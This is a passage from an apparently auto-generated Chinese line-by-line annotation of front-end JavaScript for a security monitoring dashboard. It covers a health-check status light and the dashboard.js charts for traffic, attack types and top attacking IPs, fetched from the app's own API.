| 85 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      try {` |
| 86 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `        const resp = await fetch("/api/health", {` |
| 87 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          headers: { Accept: "application/json" },` |
| 88 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        });` |
| 89 | 条件判断：根据页面状态或数据决定执行路径。 | `        if (resp.ok) {` |
| 90 | 页面更新：修改元素内容、样式或状态。 | `          light.classList.remove("status-light--warn", "status-light--danger");` |
| 91 | 页面更新：修改元素内容、样式或状态。 | `          if (label) label.textContent = "系统正常";` |
| 92 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        } else {` |
| 93 | 页面更新：修改元素内容、样式或状态。 | `          light.classList.add("status-light--warn");` |
| 94 | 页面更新：修改元素内容、样式或状态。 | `          light.classList.remove("status-light--danger");` |
| 95 | 页面更新：修改元素内容、样式或状态。 | `          if (label) label.textContent = "状态异常";` |
| 96 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        }` |
| 97 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } catch (_) {` |
| 98 | 页面更新：修改元素内容、样式或状态。 | `        light.classList.add("status-light--danger");` |
| 99 | 页面更新：修改元素内容、样式或状态。 | `        light.classList.remove("status-light--warn");` |
| 100 | 页面更新：修改元素内容、样式或状态。 | `        if (label) label.textContent = "通信失败";` |
| 101 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 102 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 103 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 104 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    check();` |
| 105 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    setInterval(check, 15000);` |
| 106 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 107 | 前端语句：驱动页面交互、状态管理或数据展示。 | `})();` |

## `web/static/js/dashboard.js`

- 类型：前端静态资源
- 行数：491

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 注释：说明前端逻辑或交互意图。 | `/*` |
| 2 | 注释：说明前端逻辑或交互意图。 | ` * dashboard.js — Phase 7 安全态势仪表盘` |
| 3 | 注释：说明前端逻辑或交互意图。 | ` *` |
| 4 | 注释：说明前端逻辑或交互意图。 | ` * 职责：` |
| 5 | 注释：说明前端逻辑或交互意图。 | ` *   - 初始化三张 ECharts 图表（流量 / 攻击类型 / Top10 攻击来源）` |
| 6 | 注释：说明前端逻辑或交互意图。 | ` *   - 拉取 \`/api/stats\`、\`/api/alerts\`、\`/api/metrics/*\`` |
| 7 | 注释：说明前端逻辑或交互意图。 | ` *   - 建立 WebSocket 订阅（Phase 7 P2 已统一事件名）：` |
| 8 | 注释：说明前端逻辑或交互意图。 | ` *       \`alert\`           -> 实时告警列表 + 时间线；高/严重等级同时弹 toast` |
| 9 | 注释：说明前端逻辑或交互意图。 | ` *       \`metrics_update\`  -> 指标卡刷新` |
| 10 | 注释：说明前端逻辑或交互意图。 | ` *       \`alert_updated\`   -> 告警状态同步（透传）` |
| 11 | 注释：说明前端逻辑或交互意图。 | ` *     旧 \`new_alert\` / \`threat_detected\` 已下线。` |
| 12 | 注释：说明前端逻辑或交互意图。 | ` *` |
| 13 | 注释：说明前端逻辑或交互意图。 | ` * 所有数据渲染都走 AGUI.escapeHtml 做 XSS 防护。` |
| 14 | 注释：说明前端逻辑或交互意图。 | ` */` |
| 15 | 前端语句：驱动页面交互、状态管理或数据展示。 | `(function () {` |
| 16 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  "use strict";` |
| 17 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 18 | 条件判断：根据页面状态或数据决定执行路径。 | `  if (!window.AGApi) return; // base.html 已保证加载顺序，这里是保险` |
| 19 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 20 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const { fetchApi } = window.AGApi;` |
| 21 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const { escapeHtml, formatTime, levelBadge, toast } = window.AGUI;` |
| 22 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 23 | 注释：说明前端逻辑或交互意图。 | `  // ECharts 共用配色` |
| 24 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const CHART_COLORS = {` |
| 25 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    emerald: "#10B981",` |
| 26 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    low: "#3B82F6",` |
| 27 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    medium: "#F59E0B",` |
| 28 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    high: "#EF4444",` |
| 29 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    critical: "#EC4899",` |
| 30 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    purple: "#8B5CF6",` |
| 31 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    text: "#E8E8EC",` |
| 32 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    subtle: "#2A2A2E",` |
| 33 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    secondary: "#8B8B96",` |
| 34 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  };` |
| 35 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 36 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  let trafficChart;` |
| 37 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  let attackTypeChart;` |
| 38 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  let topAttackerChart;` |
| 39 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  let currentRange = "24h";` |
| 40 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 41 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  document.addEventListener("DOMContentLoaded", () => {` |
| 42 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    initCharts();` |
| 43 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    bindRangeTabs();` |
| 44 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    bindRefresh();` |
| 45 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    loadInitial();` |
| 46 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    connectWebSocket();` |
| 47 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 48 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    window.addEventListener("resize", () => {` |
| 49 | 遍历处理：逐项渲染或转换数据。 | `      [trafficChart, attackTypeChart, topAttackerChart].forEach(` |
| 50 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `        (c) => c && c.resize()` |
| 51 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      );` |
| 52 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 53 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  });` |
| 54 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 55 | 注释：说明前端逻辑或交互意图。 | `  /* ----------------------------- 图表初始化 ----------------------------- */` |
| 56 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function initCharts() {` |
| 57 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!window.echarts) return;` |
| 58 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 59 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    trafficChart = window.echarts.init(` |
| 60 | DOM 查询：定位页面元素以便读取或更新。 | `      document.getElementById("chart-traffic"),` |
| 61 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      null,` |
| 62 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      { renderer: "canvas" }` |
| 63 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 64 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    trafficChart.setOption(buildTrafficOption([], []));` |
| 65 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 66 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    attackTypeChart = window.echarts.init(` |
| 67 | DOM 查询：定位页面元素以便读取或更新。 | `      document.getElementById("chart-attack-types")` |
| 68 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 69 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    attackTypeChart.setOption(buildAttackTypeOption([]));` |
| 70 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 71 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    topAttackerChart = window.echarts.init(` |
| 72 | DOM 查询：定位页面元素以便读取或更新。 | `      document.getElementById("chart-top-attackers")` |
| 73 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 74 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    topAttackerChart.setOption(buildTopAttackerOption([]));` |
| 75 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 76 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 77 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function buildTrafficOption(xaxis, series) {` |
| 78 | 返回结果：把计算值交给调用方。 | `    return {` |
| 79 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      grid: { left: 40, right: 24, top: 24, bottom: 36 },` |
| 80 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      tooltip: {` |
| 81 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        trigger: "axis",` |
| 82 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        backgroundColor: "#141416",` |
| 83 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        borderColor: "#2A2A2E",` |
| 84 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        textStyle: { color: CHART_COLORS.text },` |
| 85 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      },` |
| 86 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      xAxis: {` |
| 87 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        type: "category",` |
| 88 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        data: xaxis,` |
| 89 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        axisLine: { lineStyle: { color: CHART_COLORS.subtle } },` |
| 90 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        axisLabel: { color: CHART_COLORS.secondary, fontSize: 11 },` |
| 91 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      },` |
| 92 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      yAxis: {` |
| 93 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        type: "value",` |
| 94 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        splitLine: { lineStyle: { color: CHART_COLORS.subtle } },` |
| 95 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        axisLabel: { color: CHART_COLORS.secondary, fontSize: 11 },` |
| 96 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      },` |
| 97 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      series: [` |
| 98 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        {` |
| 99 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          name: "流量",` |
| 100 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          data: series,` |
| 101 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          type: "line",` |
| 102 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          smooth: true,` |
| 103 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          symbol: "circle",` |
| 104 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          symbolSize: 6,` |
| 105 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          areaStyle: {` |
| 106 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            color: {` |
| 107 | 前端语句：驱动页面交互、状态管理或数据展示。 | `              type: "linear",` |
| 108 | 前端语句：驱动页面交互、状态管理或数据展示。 | `              x: 0,` |
| 109 | 前端语句：驱动页面交互、状态管理或数据展示。 | `              y: 0,` |
| 110 | 前端语句：驱动页面交互、状态管理或数据展示。 | `              x2: 0,` |
| 111 | 前端语句：驱动页面交互、状态管理或数据展示。 | `              y2: 1,` |
| 112 | 前端语句：驱动页面交互、状态管理或数据展示。 | `              colorStops: [` |
| 113 | 前端语句：驱动页面交互、状态管理或数据展示。 | `                { offset: 0, color: "rgba(16,185,129,0.25)" },` |
| 114 | 前端语句：驱动页面交互、状态管理或数据展示。 | `                { offset: 1, color: "rgba(16,185,129,0.01)" },` |
| 115 | 前端语句：驱动页面交互、状态管理或数据展示。 | `              ],` |
| 116 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            },` |
| 117 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          },` |
| 118 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          lineStyle: { color: CHART_COLORS.emerald, width: 2 },` |
| 119 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          itemStyle: { color: CHART_COLORS.emerald },` |
| 120 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        },` |
| 121 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      ],` |
| 122 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    };` |
| 123 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 124 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 125 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function buildAttackTypeOption(distribution) {` |
| 126 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const fallbackColors = {` |
| 127 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      ddos: CHART_COLORS.high,` |
| 128 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      web_attack: CHART_COLORS.medium,` |
| 129 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      intrusion: CHART_COLORS.low,` |
| 130 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      anomaly: CHART_COLORS.emerald,` |
| 131 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      threat_intel: CHART_COLORS.critical,` |
| 132 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      unknown: CHART_COLORS.purple,` |
| 133 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    };` |
| 134 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 135 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const data = (distribution \|\| []).map((d) => ({` |
| 136 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      name: d.name \|\| "未知",` |
| 137 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      value: d.value \|\| 0,` |
| 138 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      itemStyle: { color: fallbackColors[d.name] \|\| CHART_COLORS.purple },` |
| 139 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }));` |
| 140 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 141 | 返回结果：把计算值交给调用方。 | `    return {` |
| 142 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      tooltip: {` |
| 143 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        trigger: "item",` |
| 144 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        backgroundColor: "#141416",` |
| 145 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        borderColor: "#2A2A2E",` |
| 146 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        textStyle: { color: CHART_COLORS.text },` |
| 147 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      },` |
| 148 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      legend: {` |
| 149 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        bottom: 0,` |
| 150 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        textStyle: { color: CHART_COLORS.secondary, fontSize: 11 },` |
| 151 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        icon: "circle",` |
| 152 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      },` |
| 153 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      series: [` |
| 154 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        {` |
| 155 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          type: "pie",` |
| 156 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          radius: ["40%", "70%"],` |
| 157 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          center: ["50%", "45%"],` |
| 158 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          avoidLabelOverlap: true,` |
| 159 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          label: {` |
| 160 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            color: CHART_COLORS.text,` |
| 161 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            fontSize: 11,` |
| 162 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            formatter: "{b}\n{d}%",` |
| 163 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          },` |
| 164 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          labelLine: { lineStyle: { color: CHART_COLORS.subtle } },` |
| 165 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          data:` |
| 166 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            data.length > 0` |
| 167 | 前端语句：驱动页面交互、状态管理或数据展示。 | `              ? data` |
| 168 | 前端语句：驱动页面交互、状态管理或数据展示。 | `              : [` |
| 169 | 前端语句：驱动页面交互、状态管理或数据展示。 | `                  {` |
| 170 | 前端语句：驱动页面交互、状态管理或数据展示。 | `                    name: "暂无数据",` |
| 171 | 前端语句：驱动页面交互、状态管理或数据展示。 | `                    value: 1,` |
| 172 | 前端语句：驱动页面交互、状态管理或数据展示。 | `                    itemStyle: { color: CHART_COLORS.subtle },` |
| 173 | 前端语句：驱动页面交互、状态管理或数据展示。 | `                  },` |
| 174 | 前端语句：驱动页面交互、状态管理或数据展示。 | `                ],` |
| 175 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        },` |
| 176 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      ],` |
| 177 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    };` |
| 178 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 179 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 180 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function buildTopAttackerOption(list) {` |
| 181 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const rows = (list \|\| []).slice().reverse();` |
| 182 | 返回结果：把计算值交给调用方。 | `    return {` |
| 183 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      grid: { left: 110, right: 24, top: 16, bottom: 24 },` |
| 184 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      tooltip: {` |
| 185 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        trigger: "axis",` |
| 186 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        axisPointer: { type: "shadow" },` |
| 187 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        backgroundColor: "#141416",` |
| 188 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        borderColor: "#2A2A2E",` |
| 189 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        textStyle: { color: CHART_COLORS.text },` |
| 190 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      },` |
| 191 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      xAxis: {` |
| 192 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        type: "value",` |
| 193 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        splitLine: { lineStyle: { color: CHART_COLORS.subtle } },` |
| 194 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        axisLabel: { color: CHART_COLORS.secondary, fontSize: 11 },` |
| 195 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      },` |
| 196 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      yAxis: {` |
| 197 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        type: "category",` |
| 198 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `        data: rows.map((r) => r.ip),` |
| 199 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        axisLine: { lineStyle: { color: CHART_COLORS.subtle } },` |
| 200 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        axisLabel: {` |
| 201 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          color: CHART_COLORS.secondary,` |
| 202 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          fontSize: 11,` |
| 203 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          fontFamily: "JetBrains Mono, monospace",` |
| 204 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        },` |
| 205 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      },` |
| 206 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      series: [` |
| 207 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        {` |
| 208 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          name: "命中次数",` |
| 209 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          type: "bar",` |
| 210 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `          data: rows.map((r) => r.count),` |
| 211 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          itemStyle: { color: CHART_COLORS.high, borderRadius: [0, 4, 4, 0] },` |
| 212 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          barMaxWidth: 16,` |
| 213 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        },` |
| 214 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      ],` |
| 215 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    };` |
| 216 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 217 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 218 | 注释：说明前端逻辑或交互意图。 | `  /* ----------------------------- 数据拉取 ----------------------------- */` |
| 219 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function loadInitial() {` |
| 220 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    await Promise.allSettled([` |
| 221 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      refreshStats(),` |
| 222 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      refreshTraffic(),` |
| 223 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      refreshAttackTypes(),` |
| 224 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      refreshTopAttackers(),` |
| 225 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      refreshAlerts(),` |
| 226 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    ]);` |
| 227 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 228 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 229 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function refreshStats() {` |
| 230 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 231 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const stats = await fetchApi("/api/stats");` |
| 232 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      applyMetrics(stats);` |
| 233 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (err) {` |
| 234 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      console.warn("拉取统计失败", err);` |
| 235 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 236 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 237 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 238 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function refreshAttackTypes() {` |
| 239 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 240 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const data = await fetchApi("/api/metrics/attack_types");` |
| 241 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      attackTypeChart && attackTypeChart.setOption(buildAttackTypeOption(data));` |
| 242 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (err) {` |
| 243 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      console.warn("拉取攻击类型失败", err);` |
| 244 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 245 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 246 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 247 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function refreshTraffic() {` |
| 248 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 249 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const data = await fetchApi("/api/metrics/traffic", {` |
| 250 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        query: { range: currentRange },` |
| 251 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 252 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const xaxis = Array.isArray(data.xaxis) ? data.xaxis : [];` |
| 253 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const series = Array.isArray(data.series) ? data.series : [];` |
| 254 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      trafficChart && trafficChart.setOption(buildTrafficOption(xaxis, series));` |
| 255 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (err) {` |
| 256 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      console.warn("拉取流量趋势失败", err);` |
| 257 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      trafficChart && trafficChart.setOption(buildTrafficOption([], []));` |
| 258 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 259 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 260 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 261 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function refreshTopAttackers() {` |
| 262 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 263 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const data = await fetchApi("/api/metrics/top_attackers");` |
| 264 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      topAttackerChart && topAttackerChart.setOption(buildTopAttackerOption(data));` |
| 265 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (err) {` |
| 266 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      console.warn("拉取攻击 Top10 失败", err);` |
| 267 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 268 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 269 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 270 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function refreshAlerts() {` |
| 271 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 272 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const list = await fetchApi("/api/alerts", { query: { limit: 20 } });` |
| 273 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      renderAlertList(list);` |
| 274 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      renderTimeline(list.slice(0, 10));` |
| 275 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (err) {` |
| 276 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      console.warn("拉取告警失败", err);` |
| 277 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 278 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 279 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 280 | 注释：说明前端逻辑或交互意图。 | `  /* ----------------------------- 指标卡渲染 ----------------------------- */` |
| 281 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const _prevMetrics = {};` |
| 282 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 283 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function applyMetrics(stats) {` |
| 284 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!stats \|\| typeof stats !== "object") return;` |
| 285 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 286 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    [` |
| 287 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      ["total_packets", ""],` |
| 288 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      ["total_threats", ""],` |
| 289 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      ["security_score", ""],` |
| 290 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      ["banned_ips", ""],` |
| 291 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    ].forEach(([key]) => {` |
| 292 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const node = document.querySelector(\`[data-metric="${key}"]\`);` |
| 293 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const trendNode = document.querySelector(\`[data-trend="${key}"]\`);` |
| 294 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (!node) return;` |
| 295 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const next = stats[key];` |
| 296 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (next === undefined \|\| next === null) return;` |
| 297 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 298 | 页面更新：修改元素内容、样式或状态。 | `      node.textContent = Number(next).toLocaleString();` |
| 299 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (trendNode) {` |
| 300 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `        const prev = _prevMetrics[key];` |
| 301 | 条件判断：根据页面状态或数据决定执行路径。 | `        if (typeof prev === "number" && prev !== next) {` |
| 302 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `          const delta = next - prev;` |
| 303 | 页面更新：修改元素内容、样式或状态。 | `          trendNode.textContent = (delta > 0 ? "▲ +" : "▼ ") + Math.abs(delta);` |
